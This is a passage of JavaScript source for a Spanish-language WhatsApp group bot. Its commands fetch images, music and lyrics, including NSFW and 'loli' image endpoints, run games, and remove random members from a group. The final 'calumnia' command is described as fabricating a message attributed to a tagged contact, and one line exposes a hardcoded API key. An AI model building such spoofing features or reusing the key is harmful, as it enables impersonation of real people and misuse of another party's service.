‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ \n${browser}`)
break
case 'playstore': //Ver info y links directos a juegos en playstore
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if(!UwU) return reply(idiomas.storeapp())
reply(idiomas.waitt())
let play = await hx.playstore(UwU)
let apprpt = '──────⊹⊱✫⊰⊹──────\n'
for (let i of play){
apprpt += `*「 _PLAY-STORE_ 」*\n    ‏  ‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ \n    ‏  ‌    ‏  ‌
- *Nombre* : ${i.name}
- *Link directo* : ${i.link}\n
- *Desarrollador* : ${i.developer}
- *Link del Desarrollador* : ${i.link_dev}\n──────⊹⊱✫⊰⊹──────`
}
reply(apprpt)
break
case 'randimg': //imagenes random 
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
var txtt =`💾`
TeslApi = await getBuffer(`https://pastebin.com/raw/EUHNaCAH`)
reply(idiomas.wait())
jsonData = JSON.parse(TeslApi)
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex]
resultado1 = await getBuffer(randKey.result)
sendButImage(from, txtt, `By Matt_M`, resultado1, 
[{buttonId: `${prefix}${command}`,buttonText: 
{displayText: idiomas.next(),},type: 1,},])
break
case 'djbot':  //audio random
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
TeslApi = await getBuffer(`https://pastebin.com/raw/W8jLrvcq`)
reply(idiomas.wait())
jsonData = JSON.parse(TeslApi)
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex]
nkptt = await getBuffer(randKey.resulptt)
teslagod.sendMessage(from, nkptt, audio, {mimetype: 'audio/mp4', ptt: true, filename: `${nkptt}.mp3`, quoted: mek})
break
case 'letra': //letra de una canción :3
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if(!UwU) return reply(idiomas.letter())
reply(idiomas.waitt())
let song = await hx.lirik(UwU)
sendMediaURL(from,song.thumb,`\n    ‏  ‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ \n`+song.lirik)
break
///⚡ /Mas comandos/⚡///
case 'labiblia':
if (isBaneado) return
if (!isNsfw) return reply(idiomas.nsfw())
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
var num = mek.participant
teslagod.updatePresence(from, Presence.recording)
teslagod.sendMessage(from, fs.readFileSync('./multimedia/imagenes/modohxd2.jpeg'), image, {quoted: nsfwmek, caption: idiomas.menunsfw(prefix), thumbnail: fs.readFileSync('./multimedia/imagenes/modohxd.jpeg'), sendEphemeral: true})
break
case 'hentai2':
           if (isBaneado) return
if (!isNsfw) return
           if (!isGroup) return reply(idiomas.group())
           if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
           if (OnOffLine === true) return reply(idiomas.sinnet())
					reply(idiomas.waittt())
					data = await fetchJson('https://akaneko-api.herokuapp.com/api/hentai')
					haasil = await getBuffer(data.url)
					teslagod.sendMessage(from, haasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
					reply(idiomas.ideh())
					break
            case 'hneko':
           if (isBaneado) return
           if (!isNsfw) return
           if (!isGroup) return reply(idiomas.group())
           if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
           if (OnOffLine === true) return reply(idiomas.sinnet())
           data = await fetchJson('https://waifu.pics/api/nsfw/neko')
           reply(idiomas.waittt())
           hasil = await getBuffer(data.url)
           teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
           reply(idiomas.ideh())
           break
                      case 'hwaifu':
                      if (isBaneado) return
           if (!isNsfw) return
           if (!isGroup) return reply(idiomas.group())
           if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
           if (OnOffLine === true) return reply(idiomas.sinnet())
data = await fetchJson('https://waifu.pics/api/nsfw/waifu')
           reply(idiomas.waittt())
           hasil = await getBuffer(data.url)
           teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
           reply(idiomas.ideh())
           break
                     case 'traph':
           if (isBaneado) return
           if (!isNsfw) return
           if (!isGroup) return reply(idiomas.group())
           if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
           if (OnOffLine === true) return reply(idiomas.sinnet())
           data = await fetchJson('https://waifu.pics/api/nsfw/trap')
           reply(idiomas.waittt())
           hasil = await getBuffer(data.url)
           teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
           reply(idiomas.ideh())
           break

//Zona crea logos :u

case 'text3d':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.waittt())
 if (args.length < 1) return reply(idiomas.comousar() + `${prefix}text3d NeKosmic`)
    teks = `${body.slice(8)}`
   if (teks.length > 10) return teslagod.sendMessage(from, '*[ ! ] 10 digitos maximo*', text, {quoted: mek})
                    buff = await getBuffer(`https://docs-jojo.herokuapp.com/api/text3d?text=${teks}`, {method: 'get'})
                    teslagod.sendMessage(from, buff, image, {quoted: mek, caption: `${teks}`, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
                    reply(idiomas.ideh())
			     	break
case 'loli2':
					if (isBaneado) return
if (!isAnime) return reply(idiomas.animes())
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
            if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.waittt())
					daata = await fetchJson('https://akaneko-api.herokuapp.com/api/loli')
					hasil = await getBuffer(daata.url)
					teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
					reply(idiomas.ideh())
					break

case 'nekos':
if (isBaneado) return
if (!isAnime) return reply(idiomas.animes())
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
            if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.waittt())
           data = await fetchJson('https://waifu.pics/api/sfw/neko')
           hasil = await getBuffer(data.url)
           teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
           reply(idiomas.ideh())
           break
           case 'waifus':
           if (isBaneado) return
if (!isAnime) return reply(idiomas.animes())
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
            if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.waittt())
           data = await fetchJson('https://waifu.pics/api/sfw/waifu')
           hasil = await getBuffer(data.url)
           teslagod.sendMessage(from, hasil, image, {quoted: mek, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
           reply(idiomas.ideh())
           break
case 'pregunta2':
		if (isBaneado) return
if (!isAnime) return reply(idiomas.animes())
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
		const testaku =['sufriste bulling por ser otaku?', 'uwu?', 'sabes cantar algun opening?', 'te bañas?', 'eres social o antisocial?', 'imitas algun movimiento de un personaje anime?', 'algun anime que te que iso reir a mas no poder?', 'personaje mas kawaii que te guste?', 'te gustan las lolis?', 'conoces o viste algun cosplayer?', 'que es ser otaku para ti?', 'recomiendarias 5 animes, como cuales?', 'anime que no te gusta', 'anime que mas odias', 'poder que quisieras tener de un personaje anime', 'te gustaria vivir tu vida como en un anime? como cual?', 'personaje anime del cual estas enamod@?', 'si reencarnarias en un mundo anime cual seria?', 'sabes que significa onichan?', 'Has cantado alguna vez el opening de tu anime favorito?', 'genero que mas te gusta de anime?', 'haces dibujos o mangas?', 'openings que no dejas de escuchar', 'te gusta el h3nta1?', 'Sabes palabras en japonés?', 'Cada cuánto tiempo ves anime?', 'Vas o has ido a convenciones de anime y manga?', 'Qué animes ves o has visto recientemente?', 'Escuchas canciones/openings de tus series favoritas?', 'Cuántas series de anime as visto?', 'Te gustaría conocer a alguien que tengas las mismas cualidades que tu personaje de anime favorito?', 'Qué es ser otaku para ti?', 'Te iniciaste solo en esto o un amigo o familiar te inicio?', 'Cuál es el género que más te gusta?', 'anime con el cual lloraste?', 'nombre del autor de naruto?', 'nombre del autor de dragon ball?', 'lees algun manga? titulo?', 'estas atento a la salida de animes nuevos?', 'algun familiar sabe que eres otaku?', 'tus amigos saben que eres otaku?', 'tienes algun poster, almohada, juguete, decoraciones de un anime?', 'que te parecio el anime bocu no pico? si no lo viste te lo recomiendo!!!', 'te gusta el NTR?', 'viste un anime yaoi? name?','que haces si alguien habla mal de tu anime fav?', 'te regalan dinero para ver anime legal, seguirias viendolo de forma ilegal?', 'te gustaria vajar a japon? por que?', 'quien crees que sea mas fuerte goku o saitma?', 'que opinas de los animes clasicos|antiguos?', 'Como se llama el Hijo de Naruto según el manga?', 'primer anime que viste?', 'anime que viste y no te gusto?', 'animes que quieres ver y no has visto?', 'tu crush del anime?(waifu)(husbando)', 'pareja fovorita del anime k viste?', 'el mejor villano del anime?', 'mejor pelea del anime que viste?', 'escena mas triste que viste en un anime?', 'personaje del anime q es parecido a ti?', 'anime antiguo q para ti no pasa de moda?', 'mascotas|animales favoritos del anime?', 'anime q para ti tiene la mejor animación?', 'personaje(femenino) favorito segundario del anime?', 'personaje(femenino) principal favorito del anime?', 'personaje(masculino) principal favorito del anime?', 'personaje(masculino) favorito segundario del anime?', 'la escena mas épica del anime para ti?', 'personaje anime q te pone de nervios?', 'arma fovorita de un anime que viste?', 'la muerte mas trite del anime que viste?', 'la mejor pelea anime?', 'la escena mas genial del anime para t?', 'un anime q decearias q fuera real?', 'frase favorita de algun personaje del anime?', 'anime q decearias q nunca acabará?', 'name de tu anime favorito?']
		const brandom = testaku[Math.floor(Math.random() * (testaku.length))]
			   hasil = `*${pushname}* \n\n▪︎ _*${brandom}*_ `
				reply(hasil)
			   break

////MASSS COMANDOS///

case 'xd': //buscador de imagenes en gugul :v
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.waittt())
ukk = ["memes sin sentido",
"random imagenes",
"shitpost magia",
"shitpost español",
"shitpost anime español",
"shitpost romantico",
"shitpost otaku",
"shitpost para contestar",
"shitpost ._.xd"]
nekuu = ukk[Math.floor(Math.random() * ukk.length)]
            const gimmg = `${nekuu}`
            imgugul(gimmg, async (error, result) => {
            gugul = result
            images = gugul[Math.floor(Math.random() * gugul.length)].url
            miniaturaNK({url:images},'ª')
            })
            reply(idiomas.ideh())
            break

////random comandos

case 'play':  //Pedir la música que quieras :D
 if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
                if (args.length === 0) return reply(idiomas.playaudi(prefix))
                reply(idiomas.waittt())
                playxd = body.slice(6)
                audinfo = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${playxd}&apikey=NikolaTesla`) //hablame a mi número para que te ayude en esto ;)
                if (audinfo.error) return reply(audinfo.error)
                infomp3 = `${audinfo.result.title}`
                linksss = `${audinfo.result.source}`
                buffermp3 = await getBuffer(audinfo.result.thumbnail)
                miniaturaNK(buffermp3,`${infomp3}\n1:30━━━━●───────── 3:17\n\n~Su audio se esta enviando~`)
                xyzeks = await getBuffer(audinfo.result.url_audio)
                teslagod.sendMessage(from, xyzeks, audio, {mimetype: 'audio/mp4', duration :-51995386439, ptt: true, filename: `${audinfo.title}.mp3`, quoted: audiowor, contextInfo:{"externalAdReply":{"title": `${infomp3}`, mediaType: 2, "thumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'),"previewType": "VIDEO","mediaUrl": `${linksss}`}},})
                xyzeks = await getBuffer(audinfo.result.url_audio)
                teslagod.sendMessage(from, xyzeks, audio, {mimetype: 'audio/mp4', filename: `${audinfo.title}.mp3`, quoted: mek})
                break
case 'play2':  //Pedir la música que quieras :D
 if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
                if (args.length === 0) return reply(idiomas.playaudi(prefix))
                reply(idiomas.waittt())
                playxd = body.slice(7)
                audinfo = await fetchJson(`https://api.zeks.me/api/ytplaymp3/2?apikey=NikolaTesla&q=${playxd}`) //hablame a mi número para que te ayude en esto ;)
                if (audinfo.error) return reply(audinfo.error)
                infomp3 = `${audinfo.result.title}`
                linksss = `${audinfo.result.source}`
                buffermp3 = await getBuffer(audinfo.result.thumb)
                miniaturaNK(buffermp3,`${infomp3}\n1:30━━━━●───────── 3:17\n\n~Su audio se esta enviando~`)
                xyzeks = await getBuffer(audinfo.result.link)
                teslagod.sendMessage(from, xyzeks, audio, {mimetype: 'audio/mp4', duration :-51995386439, ptt: true, filename: `${audinfo.title}.mp3`, quoted: audiowor, contextInfo:{"externalAdReply":{"title": `${infomp3}`, mediaType: 2, "thumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg'),"previewType": "VIDEO","mediaUrl": `${linksss}`}},})
                xyzeks = await getBuffer(audinfo.result.link)
                teslagod.sendMessage(from, xyzeks, audio, {mimetype: 'audio/mp4', filename: `${audinfo.title}.mp3`, quoted: mek})
                break


/////juegos////
case 'ttc':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (fs.existsSync(`./libreria/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*# ~TRES EN RAYA~ #*

*Ya hay un desafío en curso*\n\n*@${boardnow.X} VS @${boardnow.O}*

*Jugador ❌:* _@${boardnow.X}_

*Jugador ⭕:* _@${boardnow.O}_

*Tu turno:* _@${boardnow.turn == "X" ? boardnow.X : boardnow.O}_


${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*Sexy El Que Lo Lea 7w7 *`;
teslagod.sendMessage(from, chatMove, MessageType.text, {
quoted: estadouwur1,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(
`*# ~DESAFIO TRES EN RAYA~ #*\n\nPor favor etiqueta a un usuario para comenzar el juego\n\nEjemplo : *${prefix}ttc @participante*`
);
     const boardnow = setGame(`${from}`);
     console.log(`\nDESAFIO TRES EN RAYA COMENZADO ${boardnow.session}\n`);
     boardnow.status = false;
     boardnow.X = sender.replace("@s.whatsapp.net", "");
     boardnow.O = argss[1].replace("@", "");
     fs.writeFileSync(
           `./libreria/tictactoe/db/${from}.json`,
           JSON.stringify(boardnow, null, 2)
);
const strChat = `*# ~DESAFIO TRES EN RAYA~ #*

Hey ${argss[1]}, el usuario @${sender.replace("@s.whatsapp.net","")} Te ha desafiado a una partida de *Tres Es Raya*

Si quieres aceptar el desafio escribe : *sip*

Si no quieres aceptar el desafio escribe: *nop*`;
teslagod.sendMessage(from, strChat, MessageType.text, {
quoted: estadouwur1,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break
case 'delttc':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (fs.existsSync("./libreria/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./libreria/tictactoe/db/" + from + ".json");
reply(`Juego reiniciado exitosamente ✓`);
} else {
reply(`No hay nigún juego en curso u.u`);
}
break
case 'quien':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!UwU) return reply(`Invente un asunto`)
var group3 = await teslagod.groupMetadata(from)
var member3 = group3['participants']
var mem3 = []
member3.map( async adm => {
mem3.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
let randomv = mem3[Math.floor(Math.random() * mem3.length)]
console.log(randomv)
teslagod.sendMessage(from, `*=>* @${randomv.split('@')[0]}`, text, {quoted : mek, contextInfo: {mentionedJid : [randomv]}})
break
case 'deathnote':
if (isBaneado) return
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (!UwU) return reply(`Agrege una razon para la ejecución`)
var group3 = await teslagod.groupMetadata(from)
var member3 = group3['participants']
var mem3 = []
member3.map( async adm => {
mem3.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
let randomhard = mem3[Math.floor(Math.random() * mem3.length)]
console.log(randomhard)
teslagod.sendMessage(from, `*Death Note* 📓\n\n*Seleccinado:* _@${randomhard.split('@')[0]}_\n*Razón de muerte:* 
_${UwU}_\n\n*ᴿᶦᵘᵏ ᶜᵒᵐᵉⁿᶻᵒ́ ˢᵘ ᵗʳᵃᵇᵃʲᵒ⁻⁻⁻*`, text, {quoted : RiukF, contextInfo: {mentionedJid : [randomhard]}})
var delbruh = `${randomhard.split("@")[0]}@s.whatsapp.net`
setTimeout( () => {
teslagod.groupRemove(from, [delbruh])
}, 3500)
break
case 'ruleta':
if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
var kic2 = `${sender}`
reply(idiomas.rulett())
setTimeout( () => {
const tiro = ['salvado', 'sanpedro', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'salvado', 'sanpedro']
const figr = ['aDiosito', 'aDiosito']
tpa = tiro[Math.floor(Math.random() * (tiro.length))]
tpb = figr[Math.floor(Math.random() * (figr.length))]
figb = fs.readFileSync('./multimedia/misstks/sticker/' + tpb + '.webp')
if (tpa == 'salvado') {
var morte = '*[✓]* _Salvado mi king_'
} else if (tpa == 'sanpedro') {
var morte = '*[ ! ]* _Press F en el chat_'
}
if (morte == '*[ ! ]* _Press F en el chat_') {
setTimeout( () => {
teslagod.sendMessage(from, figb, sticker, {quoted: estarder})
}, 500)
setTimeout( () => {
teslagod.groupRemove(from, [kic2])
}, 3100)
}
teslagod.sendMessage(from, morte, text, {quoted: mek})
}, 3000)
                    break
case 'calumnia': //Crea un mensaje falso de un contacto etiquetado :v
            if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
            if (args.length < 1) return reply(idiomas.fakemsj(prefix))
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
